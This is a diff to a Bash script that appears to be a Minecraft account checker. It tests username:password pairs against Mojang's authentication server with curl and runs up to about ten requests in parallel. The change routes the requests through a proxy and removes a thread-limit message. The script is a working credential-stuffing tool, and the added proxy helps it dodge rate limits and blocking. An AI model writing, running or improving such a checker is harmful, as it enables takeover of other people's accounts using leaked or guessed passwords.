@@ -3,7 +3,7 @@
 logo() {
 
   unset blank
-  for ((i=42; i < "$COLUMNS"-1; i+=2)); do blank+=' '; done
+  for ((i=40; i < "$COLUMNS"-1; i+=2)); do blank+=' '; done
   echo
   echo "$blank   __  __________           __"
   echo "$blank  /  |/  / ___/ /  ___ ____/ /_____ ____"
@@ -181,7 +181,6 @@ worker() {
     if (( "$i" > "$nextStep" )); then
       ((nextStep=i+10))
       while (( $(ps | grep curl | wc -l) > 10 )); do
-        echo -e "\e[31mSYS > Reached max threads...\e[0m"
         sleep 1
       done
     fi
@@ -197,7 +196,7 @@ checkacc() {
 
   acc=(${1/:/ })
   while true; do
-    request=$(curl -s -m 10 -H 'Accept:application/json' -H 'content-Type:application/json' \
+    request=$(curl -s -x "$proxy" -m 10 -H 'Accept:application/json' -H 'content-Type:application/json' \
     'https://authserver.mojang.com/authenticate' -X POST \
     -d '{"username": "'${acc[0]}'", "password" "'${acc[1]}'"}' | head -c 3)
     if [[ "$request" == '{"c' ]]; then
